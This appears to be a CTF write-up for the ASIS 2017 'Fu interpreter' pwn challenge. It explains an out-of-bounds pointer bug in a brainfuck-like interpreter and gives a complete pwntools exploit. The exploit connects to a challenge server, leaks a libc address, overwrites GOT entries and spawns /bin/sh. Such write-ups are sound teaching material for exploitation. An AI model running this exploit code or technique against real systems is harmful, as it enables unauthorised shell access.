{"pageContext":{"html":"<p><a href=\"ctf=asis-ctf-quals-2017\"></a>\n<a href=\"type=exploit\"></a>\n<a href=\"tags=brainfuck\"></a>\n<a href=\"tools=pwntools\"></a>\n<a href=\"techniques=GOT%20overwrite\"></a></p>\n<h1>Fu interpreter (pwn-101)</h1>\n<p>We are given a <a href=\"/fulang_e62955ff8cc20de534a29321b80fa246ddf9763f-8d5c8e43edcfa7d21d55677293e12e50.\">file</a>.</p>\n<pre><code class=\"language-bash\">$ file fulang_e62955ff8cc20de534a29321b80fa246ddf9763f\nfulang_e62955ff8cc20de534a29321b80fa246ddf9763f: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=746b0bdb7782ec102b56e6b27507d264920be051, not stripped\n$ checksec ./fulang_e62955ff8cc20de534a29321b80fa246ddf9763f\n[*] '/tmp/fulang_e62955ff8cc20de534a29321b80fa246ddf9763f'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE\n</code></pre>\n<p>The file is not stripped, so the decompilation is quite neat. There are only two functions of interest <em>main</em> and <em>fu_interpreter</em>.</p>\n<pre><code class=\"language-c\">int fu_interpreter(char a1, char a2)\n{\n  _BYTE *v2; // ebx@13\n  char v3; // dl@15\n  signed int result; // eax@20\n\n  if ( a1 == ':' )\n  {\n    if ( a2 == '&#x3C;' )\n      --fu;\n    if ( a2 == '>' )\n      ++fu;\n    if ( a2 == '+' )\n      ++*(_BYTE *)fu;\n    if ( a2 == '-' )\n      --*(_BYTE *)fu;\n    if ( a2 == ':' )\n      putchar(*(_BYTE *)fu);\n    if ( a2 == '.' )\n    {\n      v2 = (_BYTE *)fu;\n      *v2 = getchar();\n    }\n    if ( a2 == '_' )\n    {\n      v3 = (*(_BYTE *)fu)++;\n      *(_BYTE *)fu ^= v3;\n    }\n    if ( a2 == '(' )\n      puts(\"Not implemented yet!\");\n    if ( a2 == ')' )\n      puts(\"Not implemented yet!\");\n    result = 1;\n  }\n  else\n  {\n    result = 0;\n  }\n  return result;\n}\n\nint main(int argc, const char **argv, const char **envp)\n{\n  int v4; // edi@6\n  signed __int32 i; // [sp+10h] [bp-DCh]@1\n  signed __int32 v6; // [sp+14h] [bp-D8h]@1\n  char s[4]; // [sp+18h] [bp-D4h]@1\n  char v8; // [sp+1Ch] [bp-D0h]@1\n  int v9; // [sp+E0h] [bp-Ch]@1\n  int *v10; // [sp+E8h] [bp-4h]@1\n\n  fu = (int)&#x26;data;\n  setvbuf(stdout, 0, 2, 0);\n  setvbuf(stdin, 0, 2, 0);\n  printf(\"%s\", \"[Fulang service]\\nEnter your code:\");\n  fgets(s, 150, stdin);\n  v6 = strlen(s);\n  for ( i = 0; i &#x3C; v6; i += 2 )\n  {\n    if ( !fu_interpreter(s[i], s[i + 1]) )\n    {\n      puts(\"Incorrect syntax, RTFM!\");\n      break;\n    }\n  }\n  return 0;\n}\n</code></pre>\n<p>The logic is very simple. It takes 150 bytes of brainfuck-like code and then evaluates it. One thing to note is <em>fu</em> and <em>data</em> are global variables. Array <em>data</em> is used as tape for the program to operate but since there are no bounds check on it, we can operate past it.</p>\n<pre><code class=\"language-bash\">$ gdb -q ./fulang_e62955ff8cc20de534a29321b80fa246ddf9763f\nLoaded 105 commands.  Type pwndbg [filter] for a list.\nReading symbols from ./fulang_e62955ff8cc20de534a29321b80fa246ddf9763f...(no debugging symbols found)...done.\npwndbg> p/x &#x26;fu\n$1 = 0x804a060\npwndbg> p/x &#x26;data\n$2 = 0x804a080\n</code></pre>\n<p>During execution in main current cell position is maintained in <em>fu</em> variable and it can be changed with &#x3C; or >. Since we can have 75 operations max from the brainfuck code, we can control many bytes out of <em>data</em>. As we see above the actual <em>fu</em> is located only 0x20 bytes from <em>data</em>, we can underflow to <em>fu</em> and change it to any address such that in the next call of <em>fu_interpreter</em> we can gain arbitrary read and write on that address.</p>\n<p>Since we now have arbitrary read and write and Partial RELRO, we can leak and patch GOT entries.\nThe exploitation is quite simple now.</p>\n<ul>\n<li>First patch GOT['puts'] to main. This way we can reset <em>fu</em> on every puts()</li>\n<li>Leak GOT['_<em>libc</em>start_main']. We already have the system libc from the hint in the problem. This helps calculating address of system() in libc</li>\n<li>Call puts() and restart execution to reset <em>fu</em>.</li>\n<li>Patch GOT['strlen'] to libc system address since strlen takes only one param which is the user input, perfect to patch for system()</li>\n<li>Restart main() again and \"/bin/sh\"</li>\n</ul>\n<pre><code class=\"language-python\">from pwn import *\n\ncontext(arch='i386', os='linux', log_level='info')\nlocal = len(sys.argv) == 1\nmain = 0x80486de\n\nif not local:\n    s=remote('69.90.132.40',4001)\n    __libc_start_main_base = 0x18540\n    system_base = 0x3a940\nelse:\n    s=process('./fulang_e62955ff8cc20de534a29321b80fa246ddf9763f')\n    #gdb.attach(s)\n    raw_input()\n    print hex(u32(s.leak(0x804a020,4)))\n    print s.libs()\n    __libc_start_main_base = 0x19970\n    system_base = 0x3e3e0\np = \":(:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:.:.:>:.:>:.:>:.:>:::>:::>:::>:::>:::>:::>:::>::\"\np += \":\"*(146-(len(p)))\np += \"??\" #force puts() to restart main()\ns.recvline()\ns.send(p)\ns.send(\":\\x1c\"+p32(main)) # patch GOT['puts'] to main\ns.recvline()\ns.recv(4) #leak strlen\n__libc_start_main_leak = u32(s.recv(4)) # leak __libc_start_main\nlibc_base = __libc_start_main_leak - __libc_start_main_base\nsystem = libc_base + system_base\nprint \"leak\",hex(__libc_start_main_leak), hex(system)\ntime.sleep(2)\np = \":&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:.:&#x3C;:.:>:.:>:.:>:.:>\"\np += \":\"*(146-(len(p)))\np += \"??\" #force puts() to restart main()\ns.recvline()\ns.send(p)\n\ns.send(\":\\x21\"+p32(system)) #patch GOT['strlen'] to system\ns.sendline(\"/bin/sh\")\ns.interactive()\n</code></pre>\n<p><a href=\"https://asciinema.org/a/112058\"><img src=\"https://asciinema.org/a/112058.png\" alt=\"asciicast\"></a></p>","relativePath":"writeups/asis-ctf-quals-2017/pwn/fu-interpreter/sudhackar"}}